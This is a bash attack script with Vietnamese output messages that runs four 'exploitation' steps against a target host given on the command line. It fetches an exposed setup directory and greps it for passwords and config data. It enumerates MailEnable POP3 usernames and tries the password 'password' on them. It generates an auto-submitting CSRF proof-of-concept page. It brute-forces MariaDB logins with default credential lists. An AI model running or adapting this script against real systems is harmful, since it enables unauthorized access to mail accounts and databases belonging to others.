#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Global timeout value in seconds
GLOBAL_TIMEOUT=10

# Target information
TARGET="$1"
if [ -z "$TARGET" ]; then
    echo -e "${RED}Error: No target specified.${NC}"
    echo "Usage: $0 <target_ip_or_domain> [output_file.json]"
    exit 1
fi

# Output file
OUTPUT_FILE="$2"
if [ -z "$OUTPUT_FILE" ]; then
    OUTPUT_FILE="exploitation_results.json"
fi

# Progress function
progress_indicator() {
    local pid=$1
    local message=$2
    local delay=0.5
    local spinstr='|/-\'
    local temp
    
    tput civis # Hide cursor
    echo -ne "${CYAN}$message... ${NC}"
    
    local i=0
    while kill -0 $pid 2>/dev/null; do
        temp="${spinstr#?}"
        printf " [%c]  " "${spinstr}"
        spinstr=${temp}${spinstr%"${temp}"}
        sleep $delay
        printf "\b\b\b\b\b\b"
        
        # Show dots to indicate time passing
        i=$((i+1))
        if [ $i -ge 20 ]; then  # After 10 seconds, show a warning
            echo -e "\n${YELLOW}[!] Operation taking longer than expected... ${NC}"
            i=0
        fi
    done
    
    printf "    \b\b\b\b"
    tput cnorm # Show cursor
    echo -e "${GREEN}[Hoàn thành]${NC}"
}

# Run command with timeout and show progress
run_with_timeout() {
    local command="$1"
    local output_file="$2"
    local message="$3"
    local timeout_duration="$4"
    
    # Default timeout if not specified
    if [ -z "$timeout_duration" ]; then
        timeout_duration=$GLOBAL_TIMEOUT
    fi
    
    echo -e "${GREEN}[*] Lệnh: $command${NC}"
    
    # Run the command with timeout and redirect output
    timeout $timeout_duration bash -c "$command" > "$output_file" 2>&1 &
    local pid=$!
    
    # Show progress while command is running
    progress_indicator $pid "$message"
    
    # Check if the command completed successfully
    wait $pid
    local exit_code=$?
    
    if [ $exit_code -eq 124 ]; then  # 124 is the exit code for timeout
        echo -e "${RED}[-] Thao tác bị hủy do quá thời gian ($timeout_duration giây)${NC}"
        return 1
    elif [ $exit_code -ne 0 ]; then
        echo -e "${RED}[-] Thao tác thất bại với mã lỗi $exit_code${NC}"
        return 1
    fi
    
    return 0
}

echo -e "${GREEN}[*] Bắt đầu khai thác các lỗ hổng trên $TARGET${NC}"
echo -e "${YELLOW}[*] Kết quả sẽ được lưu vào $OUTPUT_FILE${NC}"

# Create initial JSON structure
cat > "$OUTPUT_FILE" << EOF
{
    "target": "$TARGET",
    "scan_date": "$(date +'%Y-%m-%d %H:%M:%S')",
    "exploitation_results": []
}
EOF

# Function to add result to JSON
add_result() {
    local vulnerability="$1"
    local port="$2"
    local success="$3"
    local details="$4"
    local exploit_commands="$5"
    
    # Create temporary file
    TMP_FILE=$(mktemp)
    
    # Get current content without the closing brace
    sed '$ d' "$OUTPUT_FILE" > "$TMP_FILE"
    
    # Check if we need to add a comma
    if [ "$(grep -c '"exploitation_results": \[\]' "$TMP_FILE")" -eq 0 ]; then
        echo "," >> "$TMP_FILE"
    fi
    
    # Add the new result
    cat >> "$TMP_FILE" << EOF
        {
            "vulnerability": "$vulnerability",
            "port": $port,
            "success": $success,
            "details": "$details",
            "exploit_commands": "$exploit_commands"
        }
    ]
}
EOF
    
    # Replace the original file
    mv "$TMP_FILE" "$OUTPUT_FILE"
    
    echo -e "${GREEN}[+] Đã thêm kết quả cho $vulnerability trên port $port${NC}"
}

###########################################
# 1. Exploit Setup Directory Exposure
###########################################
echo -e "\n${YELLOW}[*] BƯỚC 1/4: Kiểm tra thư mục Setup bị lộ${NC}"

SETUP_EXPLOIT_CMD="curl -k -s http://$TARGET/setup/ -o setup_port80.html"
run_with_timeout "$SETUP_EXPLOIT_CMD" "/dev/null" "Đang truy cập thư mục setup trên port 80" 10

if [ -s "setup_port80.html" ]; then
    echo -e "${GREEN}[+] Truy cập thành công vào thư mục setup trên port 80${NC}"
    # Check for sensitive files
    echo -e "${CYAN}[*] Đang phân tích nội dung tìm thông tin nhạy cảm...${NC}"
    SENSITIVE_FILES=$(grep -i -E "config|install|admin|password|database|connection" setup_port80.html)
    if [ ! -z "$SENSITIVE_FILES" ]; then
        DETAILS="Setup directory contains sensitive files: $(echo $SENSITIVE_FILES | tr '\n' ' ' | head -c 100)..."
        echo -e "${GREEN}[+] Tìm thấy thông tin nhạy cảm!${NC}"
    else
        DETAILS="Setup directory accessible but no obvious sensitive files found"
        echo -e "${YELLOW}[!] Truy cập được thư mục setup nhưng không tìm thấy thông tin nhạy cảm${NC}"
    fi
    add_result "Setup Directory Exposure" "80" "true" "$DETAILS" "$SETUP_EXPLOIT_CMD"
else
    echo -e "${RED}[-] Không thể truy cập thư mục setup trên port 80${NC}"
    add_result "Setup Directory Exposure" "80" "false" "Failed to access or empty directory" "$SETUP_EXPLOIT_CMD"
fi

# Try on HTTPS (port 443)
SETUP_EXPLOIT_CMD="curl -k -s https://$TARGET/setup/ -o setup_port443.html"
run_with_timeout "$SETUP_EXPLOIT_CMD" "/dev/null" "Đang truy cập thư mục setup trên port 443" 10

if [ -s "setup_port443.html" ]; then
    echo -e "${GREEN}[+] Truy cập thành công vào thư mục setup trên port 443${NC}"
    # Check for sensitive files
    echo -e "${CYAN}[*] Đang phân tích nội dung tìm thông tin nhạy cảm...${NC}"
    SENSITIVE_FILES=$(grep -i -E "config|install|admin|password|database|connection" setup_port443.html)
    if [ ! -z "$SENSITIVE_FILES" ]; then
        DETAILS="Setup directory contains sensitive files: $(echo $SENSITIVE_FILES | tr '\n' ' ' | head -c 100)..."
        echo -e "${GREEN}[+] Tìm thấy thông tin nhạy cảm!${NC}"
    else
        DETAILS="Setup directory accessible but no obvious sensitive files found"
        echo -e "${YELLOW}[!] Truy cập được thư mục setup nhưng không tìm thấy thông tin nhạy cảm${NC}"
    fi
    add_result "Setup Directory Exposure" "443" "true" "$DETAILS" "$SETUP_EXPLOIT_CMD"
else
    echo -e "${RED}[-] Không thể truy cập thư mục setup trên port 443${NC}"
    add_result "Setup Directory Exposure" "443" "false" "Failed to access or empty directory" "$SETUP_EXPLOIT_CMD"
fi

###########################################
# 2. Exploit MailEnable POP3 Vulnerabilities
###########################################
echo -e "\n${YELLOW}[*] BƯỚC 2/4: Kiểm tra lỗ hổng MailEnable POP3${NC}"

# Test for known usernames
POP3_USERNAMES=("admin" "administrator" "postmaster" "webmaster" "root" "user" "test")

# Function to test POP3 authentication for a username
test_pop3_auth() {
    local port="$1"
    local username="$2"
    local protocol="$3"
    
    echo -e "${CYAN}[*] Thử với tài khoản: $username${NC}"
    
    # Use ncat (part of nmap) if available, otherwise use nc
    if command -v ncat &> /dev/null; then
        NC_CMD="ncat"
    else
        NC_CMD="nc"
    fi
    
    if [ "$protocol" = "ssl" ]; then
        # For SSL/TLS connections, use openssl instead
        EXPLOIT_CMD="echo -e 'USER $username\\nPASS password\\nQUIT\\n' | timeout 5 openssl s_client -connect $TARGET:$port -quiet"
        echo -e "${GREEN}[*] Lệnh: $EXPLOIT_CMD${NC}"
        
        # Run with timeout to avoid hanging
        RESULT=$(echo -e "USER $username\nPASS password\nQUIT\n" | timeout 5 openssl s_client -connect "$TARGET:$port" -quiet 2>&1)
        POP3_STATUS=$?
        
        if [ $POP3_STATUS -eq 124 ]; then  # 124 is timeout's exit code
            echo -e "${RED}[-] Kết nối bị hủy do quá thời gian${NC}"
            return 1
        fi
    else
        EXPLOIT_CMD="echo -e 'USER $username\\nPASS password\\nQUIT\\n' | timeout 5 $NC_CMD $TARGET $port"
        echo -e "${GREEN}[*] Lệnh: $EXPLOIT_CMD${NC}"
        
        # Run with timeout to avoid hanging
        RESULT=$(echo -e "USER $username\nPASS password\nQUIT\n" | timeout 5 $NC_CMD "$TARGET" "$port" 2>&1)
        POP3_STATUS=$?
        
        if [ $POP3_STATUS -eq 124 ]; then
            echo -e "${RED}[-] Kết nối bị hủy do quá thời gian${NC}"
            return 1
        fi
    fi
    
    # Display the result
    echo -e "${CYAN}[*] Kết quả: ${NC}"
    echo "$RESULT" | head -5
    
    if echo "$RESULT" | grep -i "OK\|success\|welcome\|incorrect\|invalid\|failed"; then
        # If we get a response that indicates user exists but wrong password
        if echo "$RESULT" | grep -i "incorrect\|invalid\|failed\|bad\|auth"; then
            echo -e "${YELLOW}[+] Tài khoản $username tồn tại nhưng mật khẩu không đúng${NC}"
            add_result "MailEnable POP3 Username Enumeration" "$port" "true" "Username '$username' exists but requires valid password" "$EXPLOIT_CMD"
            return 0
        # If we get a successful login (unlikely with random password)
        elif echo "$RESULT" | grep -i "welcome\|OK\|success\|message\|mailbox"; then
            echo -e "${GREEN}[+] Đăng nhập thành công với tài khoản $username và mật khẩu 'password'${NC}"
            add_result "MailEnable POP3 Weak Authentication" "$port" "true" "Successfully logged in with username '$username' and password 'password'" "$EXPLOIT_CMD"
            return 0
        fi
    fi
    
    echo -e "${RED}[-] Tài khoản $username không tồn tại hoặc kết nối thất bại${NC}"
    return 1
}

# Try to exploit MailEnable on port 110 (cleartext)
echo -e "${YELLOW}[*] Kiểm tra MailEnable POP3 trên port 110${NC}"
POP3_EXPLOITED=false

for username in "${POP3_USERNAMES[@]}"; do
    if test_pop3_auth 110 "$username" "cleartext"; then
        POP3_EXPLOITED=true
        break
    fi
done

if [ "$POP3_EXPLOITED" = false ]; then
    echo -e "${RED}[-] Không thể khai thác MailEnable POP3 trên port 110${NC}"
    add_result "MailEnable POP3 Vulnerability" "110" "false" "Could not find valid usernames or authenticate" "Multiple POP3 auth attempts"
fi

# Try to exploit MailEnable on port 995 (SSL/TLS)
echo -e "${YELLOW}[*] Kiểm tra MailEnable POP3 trên port 995 (SSL)${NC}"
POP3_SSL_EXPLOITED=false

for username in "${POP3_USERNAMES[@]}"; do
    if test_pop3_auth 995 "$username" "ssl"; then
        POP3_SSL_EXPLOITED=true
        break
    else
        echo -e "${YELLOW}[!] Bỏ qua kiểm tra thêm trên port 995 do kết nối không ổn định${NC}"
        break
    fi
done

if [ "$POP3_SSL_EXPLOITED" = false ]; then
    echo -e "${RED}[-] Không thể khai thác MailEnable POP3 trên port 995 (SSL)${NC}"
    add_result "MailEnable POP3 SSL Vulnerability" "995" "false" "Could not find valid usernames or authenticate" "Multiple POP3S auth attempts"
fi

###########################################
# 3. Exploit CSRF Vulnerability on port 8443
###########################################
echo -e "\n${YELLOW}[*] BƯỚC 3/4: Kiểm tra lỗ hổng CSRF trên port 8443${NC}"

# First, get the form from the main page
CSRF_EXPLOIT_CMD="curl -k -s https://$TARGET:8443/ -o main_page.html"
run_with_timeout "$CSRF_EXPLOIT_CMD" "/dev/null" "Đang tải trang chính từ port 8443" 10

# Check if form exists
if grep -q "form" main_page.html; then
    echo -e "${GREEN}[+] Tìm thấy form trên trang chính${NC}"
    
    # Extract form action URL
    FORM_ACTION=$(grep -o 'action="[^"]*"' main_page.html | head -1 | cut -d'"' -f2)
    if [ -z "$FORM_ACTION" ]; then
        FORM_ACTION="/cp/login"  # Guessing common endpoint
        echo -e "${YELLOW}[!] Không tìm thấy action URL, sử dụng giá trị mặc định: $FORM_ACTION${NC}"
    else
        echo -e "${GREEN}[+] Tìm thấy form action: $FORM_ACTION${NC}"
    fi
    
    # Create a CSRF PoC
    echo -e "${CYAN}[*] Đang tạo mã khai thác CSRF...${NC}"
    cat > csrf_poc.html << EOF
<!DOCTYPE html>
<html>
<body>
<h1>CSRF Exploitation Test</h1>
<form id="csrf-form" action="https://$TARGET:8443$FORM_ACTION" method="POST">
    <input type="text" name="username" value="admin" />
    <input type="password" name="password" value="password" />
    <input type="submit" value="Submit" />
</form>
<script>
    // Auto-submit the form
    document.getElementById("csrf-form").submit();
</script>
</body>
</html>
EOF
    
    echo -e "${GREEN}[+] Đã tạo mã khai thác CSRF trong file csrf_poc.html${NC}"
    add_result "CSRF Vulnerability" "8443" "true" "Created CSRF PoC that can submit forms without CSRF protection" "Created CSRF PoC HTML file"
else
    echo -e "${RED}[-] Không tìm thấy form trên trang chính${NC}"
    # Try to find cp/javascript/main.js which was mentioned in scan
    CSRF_EXPLOIT_CMD="curl -k -s https://$TARGET:8443/cp/javascript/main.js -o main.js"
    run_with_timeout "$CSRF_EXPLOIT_CMD" "/dev/null" "Đang tải file main.js" 10
    
    if [ -s "main.js" ]; then
        echo -e "${GREEN}[+] Tìm thấy file main.js${NC}"
        # Look for form IDs in the JavaScript file
        echo -e "${CYAN}[*] Đang phân tích file main.js tìm form ID...${NC}"
        FORM_IDS=$(grep -o 'form id="[^"]*"' main.js || grep -o "form[[:space:]]\+id=['\"][^'\"]*['\"]" main.js)
        
        if [ ! -z "$FORM_IDS" ]; then
            echo -e "${GREEN}[+] Tìm thấy form ID trong JavaScript: $FORM_IDS${NC}"
            add_result "CSRF Vulnerability" "8443" "true" "Found forms in JavaScript that likely have no CSRF protection: $FORM_IDS" "$CSRF_EXPLOIT_CMD"
        else
            echo -e "${RED}[-] Không tìm thấy form ID trong JavaScript${NC}"
            add_result "CSRF Vulnerability" "8443" "false" "Found main.js but could not identify form targets" "$CSRF_EXPLOIT_CMD"
        fi
    else
        echo -e "${RED}[-] Không tìm thấy file main.js${NC}"
        add_result "CSRF Vulnerability" "8443" "false" "Could not verify CSRF vulnerability" "$CSRF_EXPLOIT_CMD"
    fi
fi

###########################################
# 4. Attempt MariaDB Exploitation
###########################################
echo -e "\n${YELLOW}[*] BƯỚC 4/4: Thử khai thác MariaDB trên port 3306${NC}"

# Try common username/password combinations
MYSQL_USERS=("root" "admin" "user" "mysql")
MYSQL_PASSWORDS=("" "root" "password" "admin" "mysql")

MARIADB_EXPLOITED=false

for user in "${MYSQL_USERS[@]}"; do
    for pass in "${MYSQL_PASSWORDS[@]}"; do
        MYSQL_EXPLOIT_CMD="mysql -h $TARGET -u $user -p'$pass' -e 'SELECT VERSION();'"
        echo -e "${CYAN}[*] Thử đăng nhập với tài khoản $user / mật khẩu '$pass'${NC}"
        
        if command -v mysql &> /dev/null; then
            # Actual MySQL client command (with timeout to avoid hanging)
            echo -e "${GREEN}[*] Lệnh: $MYSQL_EXPLOIT_CMD${NC}"
            timeout 5 mysql -h "$TARGET" -u "$user" -p"$pass" -e 'SELECT VERSION();' &> mysql_result.txt
            MYSQL_STATUS=$?
            
            if [ $MYSQL_STATUS -eq 0 ]; then
                echo -e "${GREEN}[+] Kết nối thành công tới MariaDB với tài khoản $user và mật khẩu '$pass'${NC}"
                VERSION=$(cat mysql_result.txt | grep -v "VERSION" | head -1)
                add_result "MariaDB Weak Authentication" "3306" "true" "Connected with user '$user' and password '$pass'. Version: $VERSION" "$MYSQL_EXPLOIT_CMD"
                MARIADB_EXPLOITED=true
                break 2
            elif [ $MYSQL_STATUS -eq 124 ]; then
                echo -e "${RED}[-] Kết nối bị hủy do quá thời gian${NC}"
                continue
            else
                echo -e "${RED}[-] Đăng nhập thất bại${NC}"
            fi
        else
            # Fallback to netcat if mysql client is not available
            echo -e "${YELLOW}[*] Không tìm thấy MySQL client, thử với netcat${NC}"
            PACKET="\x14\x00\x00\x00\x03SELECT VERSION();"
            printf "$PACKET" | timeout 5 nc -w 5 "$TARGET" 3306 > mysql_result.txt
            
            if grep -q "MariaDB" mysql_result.txt; then
                echo -e "${YELLOW}[+] Lấy được banner MariaDB nhưng không thể khai thác đầy đủ không có MySQL client${NC}"
                add_result "MariaDB Banner Grab" "3306" "false" "Retrieved banner but cannot authenticate without MySQL client" "nc -w 5 $TARGET 3306"
                break 2
            fi
        fi
    done
done

if [ "$MARIADB_EXPLOITED" = false ]; then
    echo -e "${RED}[-] Không thể khai thác MariaDB trên port 3306${NC}"
    # Try to verify if the host restriction message exists
    if grep -q "Host.*not allowed to connect" mysql_result.txt; then
        echo -e "${YELLOW}[!] Server có hạn chế kết nối từ host bên ngoài${NC}"
        add_result "MariaDB Access Control" "3306" "false" "Host restriction in place, external access denied" "Multiple MySQL connection attempts"
    else
        add_result "MariaDB Exploitation" "3306" "false" "Could not connect with common credentials" "Multiple MySQL connection attempts"
    fi
fi

echo -e "\n${GREEN}[*] Quá trình khai thác đã hoàn tất!${NC}"
echo -e "${GREEN}[*] Kết quả đã được lưu vào $OUTPUT_FILE${NC}"
echo -e "${YELLOW}[*] Đang dọn dẹp các file tạm...${NC}"

# Clean up
rm -f setup_port80.html setup_port443.html main_page.html main.js mysql_result.txt

echo -e "${GREEN}[*] Hoàn thành!${NC}" 